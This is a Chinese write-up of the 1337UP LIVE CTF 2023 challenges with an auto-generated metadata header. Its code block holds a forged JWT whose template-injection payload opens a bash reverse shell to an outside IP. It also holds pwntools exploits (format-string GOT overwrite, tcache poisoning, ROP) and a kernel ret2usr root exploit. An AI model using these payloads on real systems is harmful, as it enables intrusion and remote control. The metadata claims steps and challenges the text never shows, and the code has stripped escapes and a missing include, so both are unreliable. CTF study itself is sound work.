---
title: 1337UP LIVE CTF WriteUp
contest: 1337UP LIVE CTF 2023
year: 2023
difficulty: medium
vuln_type:
- stego_image
- sqli
- lfi
- web_unknown
- misc_unknown
- reverse
tags:
- Intigriti
- jpg-zip-concat
- stegsolve
- sha256-crack
- X-Forwarded-For
- BioCorp
- XOR-reversible
- wifi-pcap
- knight-knight
- escargot-esolang
attack_chain:
- 'Q1 Sanity Check: 直接看题面 INTIGRITI{1f_y0u_l34v3_7h3_fl46_w1ll_b3_r3v0k3d}'
- 'Q2 In Plain Sight: jpg 尾接 zip（FFD9 + 504B 中间是 zip），解压后 stegsolve 出 flag'
- 'Q3 Socials: Twitter h0p3_y0u + youtube _3nj0y_ + reddit d4_c7f → INTIGRITI{h0p3_y0u_3nj0y_d4_c7f}'
- 'Q4 irrOReversible: 按位或运算 → 传 256 个 x00 还原 → INTIGRITI{b451c_x0r_wh47?}'
- 'Q5 Pizza Paradise: robots.txt → js 登录 sha256 爆破 → 任意文件读'
- 'Q6 BioCorp: PHP $_SERVER 超全局 → X-Forwarded-For / X-Biocorp-VPN 等头变 HTTP_* 访问内部资源'
- 'Q7 Knight: 两层 knight escargot esolang → INTIGRITI{}'
- 'Q8 WIFI: pcap 解 WPA2 → 拿 SSID/密码'
key_payload: INTIGRITI{1f_y0u_l34v3_7h3_fl46_w1ll_b3_r3v0k3d}
one_liner: 1337UP LIVE CTF 8 大题：sanity + stego + XOR + web + bio + wifi + esolang
lesson: jpg 后接 zip 是经典 MISC 套路；XOR 全 0 还原是 reverse 入门；escargot esolang 是字符画
quality: high
full_path: 1337UP_LIVE_CTF_WriteUp.full.md
meta_path: 1337UP_LIVE_CTF_WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '1337UP LIVE CTF WriteUp。1337UP LIVE CTF 8 大题：sanity + stego + XOR + web + bio + wifi + esolang。关键路径：Q1 Sanity Check: 直接看题面 INTIGRITI{1f_y0u_l34v3_7h3_fl46_w1ll_b3_r3v0k3d} → Q2 In Plain Sight: jpg ...'
category: misc
subcategory: stego
subcategories:
- stego
- sql_injection
- lfi
- web_other
- misc_other
- reverse
tools_used:
- PHP
- Stegsolve
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/216053.html
reasoning_chain:
- 触发点：INTIGRITI 多题 writeup 含 WARMUP/WEB/pwn/misc → 假设：每题考察一个独立小点
- Q2 In Plain Sight trigger：jpg 文件末尾不止 FFD9 → 动作：hexdump 看 magic → 观察：FFD9 ... 504B0304 zip header 拼接
- 动作：split 提 zip 部分解压 → 观察：内部是另一张 PNG → stegsolve 各 bit plane → 观察：LSB 平面出 flag
- Q4 irrOReversible trigger：题面说 OR 运算 → 假设：传 256 个 x00 → 0 OR 0 = 0还原原始字节
- 动作：bytes.fromhex('00'*256) → 观察：hex 转出 'INTIGRITI{b451c_x0r_wh47?}'
- Q5 Pizza Paradise trigger：扫 /robots.txt 发现管理后台 → 假设：js 登录逻辑用 sha256 校验
- 动作：rockyou.txt sha256 爆破常见密码 → 观察：admin/admin 等弱密码命中 → 任意文件读 endpoint
- Q6 BioCorp trigger：PHP 后台 → 假设：$_SERVER 把 X-Foo 变 HTTP_X_FOO，'-' → '_'
- 动作：加 X-Forwarded-For / X-Biocorp-VPN 头 → 观察：读到内部资源 flag
- Q7 Knight trigger：knight escargot esolang 字符画 → 动作：按 esolang spec 解码两层 knight cipher
- Q8 WIFI trigger：WIFI pcap → 假设：WPA2 4-way handshake → 动作：aircrack-ng + rockyou.txt → 观察：拿到 SSID + 密码
- Q9 QR 复原 trigger：obscured.png 切成 4 块每块拆 a/b 三角 → 假设：题目说 a_order 是 PIN, b_order 反转
- 动作：permutations(4) 遍历 24×24 组合，每组合拼图保存 → 观察：扫码得 flag
- Q11 JWT trigger：JWT secret 默认空字符串 → 假设：alg=none 或弱 secret → 动作：爆破 secret 或改 alg=none
failed_attempts:
- Q2 用 7z 自动识别 → 失败：jpg-zip 拼接 7z 当成单文件不解
- Q5 msg 直接 SQLi 登录 → 失败：JS 前端 sha256 校验，不是 SQL
- Q6 只用 X-Real-IP 头 → 失败：PHP $_SERVER 只对 X-Forwarded-For/X-Biocorp-VPN 起反应
- Q7 当作 brainfuck 解 → 失败：是 knight esolang 不是 bf
- Q9 直接拼图 → 失败：必须按 PIN 顺序排列，否则扫不出
key_observations:
- jpg-zip-png 拼接是 MISC 经典套路：FFD9 后接 504B0304（zip）+ 89504E47（png）
- PHP $_SERVER 把 header X-Foo-Bar 转成 HTTP_X_FOO_BAR，攻击者可注入内部字段
- OR 运算的零元是 0：传 256 个 0x00 = 等同 no-op 还原原始内容
- rockyou.txt + sha256/sha1 爆破是 web 弱密码必杀
- aircrack-ng 字典攻击解 WPA2 handshake 是 WiFi CTF 标准解法
- JWT alg=none 或弱 secret = 直接伪造 token
prerequisites:
- MISC 文件格式 magic bytes（FFD9/504B/89504E47/4D5A）
- stegsolve 位平面 / LSB 分析
- PHP $_SERVER 超全局变量行为
- aircrack-ng WPA2 字典攻击
- JWT签名验证绕过（alg=none / 弱 secret）
- pwntools format string / ROP / tcache 攻击基础
---
# 1337UP LIVE CTF  WriteUp

> 原文: https://www.ctfiot.com/216053.html
> ID: 216053

我们新点击蓝字

关注我们

声明

本文作者：CTF战队

本文字数：23779字

阅读时长：约60分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

1337UP LIVE CTF

https://ctf.intigriti.io

WARMUP

Sanity Check

INTIGRITI{1f_y0u_l34v3_7h3_fl46_w1ll_b3_r3v0k3d}

In Plain Sight

jpg图片后接了一个压缩包，手动提取一下，FFD9和504B中间的就是压缩包的密码，解压以后扔stegsolve

Socials

Twitter:

h0p3_y0u

youtube:

_3nj0y_

reddit:

d4_c7f

总flag：

INTIGRITI{h0p3_y0u_3nj0y_d4_c7f}

irrOReversible

题目猜到是按位或运算。直接传入256个x00即可。

hex转一下出

INTIGRITI{b451c_x0r_wh47?}

WEB

Pizza Paradise

源代码没东西，扫一下目录，发现robots.txt。

进去后看js的登录逻辑，直接爆sha256

登进去发现一个下载图片的网页，抓包测了一下发现可以任意文件读

BioCorp

php的$_SERVER是一个超全局变量，将请求头加上HTTP_前缀，然后把-变成_

X-Forwarded-For → HTTP_X_FORWARDED_FOR

X-Biocorp-VPN → HTTP_X_BIOCORP_VPN

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
INTIGRITI{1f_y0u_l34v3_7h3_fl46_w1ll_b3_r3v0k3d}
h0p3_y0u
_3nj0y_
d4_c7f
INTIGRITI{h0p3_y0u_3nj0y_d4_c7f}
INTIGRITI{b451c_x0r_wh47?}
const crypto = require('crypto');
const jwt = require("json-web-token");

const jwk = { "kty": "RSA", "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw", "e": "AQAB", "alg": "RS256", "use": "sig" };
const base64urlDecode = (str) =>
    Buffer.from(str.replace(/-/g, '+').replace(/_/g, '/'), 'base64');

const publicKey = crypto.createPublicKey({
    key: {
        kty: jwk.kty,
        n: base64urlDecode(jwk.n).toString('base64'), 
        e: base64urlDecode(jwk.e).toString('base64')  
    },
    format: 'jwk'
});

console.log(publicKey.export({ format: 'pem', type: 'spki' }));
const abc = publicKey.export({ format: 'pem', type: 'spki' });

let result = jwt.encode(abc, {
    "username": "#{process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/124.71.173.232/9001 0>&1"')}"}, "HS256")
console.log(result);

// JSON.stringify(process.env) eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7SlNPTi5zdHJpbmdpZnkocHJvY2Vzcy5lbnYpfSJ9.h_9iOoB-dvIGW7R3zTVBr0FffiHxWe1tmP_-E7RJsOo
SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUr
EPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd1
23SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEc
UrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoR
d123SuPeRsEcUrEPaSsWoRd123
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
    #io=process("./chal")
io=remote("riggedslot2.ctf.intigriti.io", 1337)

rv = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug():
    gdb.attach(io)
    pause()

name="AAAAAAAAAAAAAAAAAAAA"
p=name+p32(1337420+1)
sla(":",p)
sla(":","1")
print ru("}")
from pwn import *

context(arch='amd64',os='linux')
context.terminal = ["tmux", "splitw", "-h"]
    #io=process("./chal")
io=remote("floormatsale.ctf.intigriti.io", 1339)

rv = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug():
    gdb.attach(io)

p=fmtstr_payload(10,{0x040408C:
0x1})
print len(p)
sla(":","6")
sla(":",p)
print ru("}")
shell()
from pwn import *

    #context(arch='amd64',os='linux',log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
    #io=process("./drone")
io=remote("uap.ctf.intigriti.io", 1340)

rv = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug():
    gdb.attach(io)

win=0x0400836
sl("1")
sl("2")
sl("1")
sl("4")
sl(p64(0x1)+p64(win)*3)
sl("3")
sl("1")
print ru("}")
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
    #io=process("./notepad")
io=remote("notepad.ctf.intigriti.io", 1341)

rv = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug():
    gdb.attach(io)

ru(": ")
pie=int(rl(),16)-0x0119A
key=pie+0x020204C

def create(idx,size,content):
    sla(">","1")
    sla(">",str(idx))
    sla(">",str(size))
    sa(">",content)

def view(idx):
    sla(">","2")
    sla(">",str(idx))

def edit(idx,content):
    sla(">","3")
    sla(">",str(idx))
    sa(">",content)

def free(idx):
    sla(">","4")
    sla(">",str(idx))

def secret():
    sla(">","5")

create(0,128,"A"*8)
create(1,128,"B"*8)
free(0)
free(1)
edit(1, p64(key))
create(3,128,"D"*8)
create(4,128,p64(0xCAFEBABE))
secret()
shell()
from pwn import *

context(arch='amd64',os='linux',log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
    #io=process("./retro2win")
io=remote("retro2win.ctf.intigriti.io", 1338)

rv = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug():
    gdb.attach(io)

    #io=process("./retro2win")
io=remote("retro2win.ctf.intigriti.io", 1338)
win=0x0400736
sla(":","1337")
sla(":","A"*24+p64(0x0400589)+p64(0x00000000004009b3)+p64(0x2323232323232323)+p64(0x00000000004009b1)+p64(0x4242424242424242)+p64(0)+p64(win))
print ru("}")
shell()
from pwn import *

s       = lambda data               :io.send(data)
sa      = lambda tag,data           :io.sendafter(tag, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda tag,data           :io.sendlineafter(tag, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
rl      = lambda                    :io.recvline()
l64     = lambda      :
u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))

io = process("./pwn")
elf = ELF("./pwn")

def toBytes(d):
    return str(d).encode()

def menu(choice):
    sla(b"> ",toBytes(choice))

def add(idx, content):
    menu(1)
    sla(b"> ",toBytes(idx))
    sla(b"> ", content)

def show(idx):
    menu(2)
    sla(b"> ",toBytes(idx))

def delete(idx):
    menu(3)
    sla(b"> ",toBytes(idx))

context.log_level = "debug"
context.arch = "amd64"

def exp():
    
    # 0x28150
    libc = ELF("./libc.so.6")
    add(0, b"%8$p%13$p")
    show(0)
    ru(b"0x")
    stack = int(r(12), 16) + 0x18
    ru(b"0x")
    libc_base = int(r(12), 16) - 0x28150
    print(hex(libc_base))
    delete(0)

    add(1, f"%{stack & 0xffff}c%14$hn".encode())
    show(1)
    add(2, f"%{elf.got['free'] & 0xffff}c%44$hn".encode())
    show(2)
    add(3, f"%{(libc_base + libc.sym['system']) & 0xffff}c%15$hn")
    show(3)
    add(4, f"%{(elf.got['free']+2) & 0xffff}c%44$hn".encode())
    show(4)
    add(5, f"%{((libc_base + libc.sym['system']) >> 16) & 0xffff}c%15$hn")
    show(5)
    add(6, b"/bin/shx00")
    delete(6)

exp()
io.interactive()
// musl-gcc exp.c -o exp -masm=intel -static
    #include <stdio.h>
    #include 
    #include <stdlib.h>

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status(void)
{
 asm volatile ("mov user_cs, cs;"
 "mov user_ss, ss;"
 "mov user_sp, rsp;"
 "pushf;"
 "pop user_rflags;"
 );
 puts("[+]save status successfully");
}

size_t commit_creds, prepare_kernel_cred;
void change_cred(){
 char* (*pkc)(int) = prepare_kernel_cred;
 void (*cc)(char*) = commit_creds;
 (*cc)((*pkc)(0));
}

void getshell(){
 system("/bin/sh");
}

void ret_2_user(){
 asm(
 "iretqn"
 "retn"
 );
}

size_t vmlinux_base, canary, swapgs;
int main(){
 save_status();
 size_t buf[0x80];
 int fd = open("/dev/baby", 2);
 read(fd, buf, 0x280);
 canary = buf[50];
 printf("canary: %pn", canary);
 vmlinux_base = buf[51] - 0x1ca727 - 0xFFFFFFFF81000000;
 prepare_kernel_cred = vmlinux_base + 0xFFFFFFFF810861D0;
 commit_creds = vmlinux_base + 0xFFFFFFFF81085FA0;
 swapgs = vmlinux_base + 0xffffffff81c00f0a;
 printf("prepare_kernel_cred: %pn", prepare_kernel_cred);
 printf("commit_creds: %pn", commit_creds);

 int i = 50;
 buf[i++] = canary;
 buf[i++] = (size_t)change_cred;
 buf[i++] = (size_t)swapgs;
 buf[i++] = 0xdeadbeef;
 buf[i++] = (size_t)(ret_2_user+4);
 buf[i++] = (size_t)(getshell+1);
 buf[i++] = user_cs;
 buf[i++] = user_rflags;
 buf[i++] = user_sp;
 buf[i++] = user_ss;

 write(fd, buf, 0x280);
}
Hey, check this QR code ASAP! It's highly sensitive so I scrambled it, but you shouldn't have a hard time reconstructing - just make sure to update the a_order to our shared PIN. The b_order is the reverse of that 😉
from PIL import Image, ImageDraw
from itertools import permutations

# 打开原始的 QR 码图像
qr_code_image = Image.open("obscured.png")
width, height = qr_code_image.size
half_width, half_height = width // 2, height // 2

# 定义每个区域的坐标
squares = {
    "1": (0, 0, half_width, half_height),
    "2": (half_width, 0, width, half_height),
    "3": (0, half_height, half_width, height),
    "4": (half_width, half_height, width, height)
}

# 将方块分割为三角形的函数
def split_square_into_triangles(img, box):
    x0, y0, x1, y1 = box
    a_triangle_points = [(x0, y0), (x1, y0), (x0, y1)]
    b_triangle_points = [(x1, y1), (x1, y0), (x0, y1)]

    def crop_triangle(points):
        mask = Image.new("L", img.size, 0)
        draw = ImageDraw.Draw(mask)
        draw.polygon(points, fill=255)
        triangle_img = Image.new("RGBA", img.size)
        triangle_img.paste(img, (0, 0), mask)
        return triangle_img.crop((x0, y0, x1, y1))

    return crop_triangle(a_triangle_points), crop_triangle(b_triangle_points)

# 提取每个区域的三角形
triangle_images = {}
for key, box in squares.items():
    triangle_images[f"{key}a"], triangle_images[f"{key}b"] = split_square_into_triangles(qr_code_image, box)

# 遍历所有可能的排列组合
all_permutations = permutations(["1", "2", "3", "4"])
for a_order in all_permutations:
    for b_order in permutations(["1", "2", "3", "4"]):
        # 创建一个空的图像以存储最终组合结果
        reconstructed_image = Image.new("RGBA", qr_code_image.size)

        # 将四个方块组合到结果图像中
        for i in range(4):
            a_triangle = triangle_images[f"{a_order[i]}a"]
            b_triangle = triangle_images[f"{b_order[i]}b"]
            combined_square = Image.new("RGBA", (half_width, half_height))
            combined_square.paste(a_triangle, (0, 0))
            combined_square.paste(b_triangle, (0, 0), b_triangle)
            reconstructed_image.paste(combined_square, [
                                      (0, 0), (half_width, 0), (0, half_height), (half_width, half_height)][i])

        # 保存组合结果
        output_filename = f"reconstructed_{''.join(a_order)}_{''.join(b_order)}.png"
        reconstructed_image.save(output_filename)
        print(f"Saved {output_filename}")
INTIGRITI{5q1_log_analys1s_f0r_7h3_w1n!}
from pwn import remote,p64,context
local=0
if local==1:
    p=remote('192.168.202.129',10001)
else:
    p=remote('securebank.ctf.intigriti.io',1335)
    
context.log_level='debug'    
# context.arch='amd64'
# context.os='linux'

try:
    p.recvuntil(b'Enter superadmin PIN: ')
    p.sendline(b'1337')
    p.recvuntil(b'Enter your 2FA code: ')
    p.sendline(b'5670688')
    p.recvall()
        
    
except Exception as e:
    print('error')
finally:
    p.interactive()
#INTIGRITI{pfff7_wh47_2f4?!}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]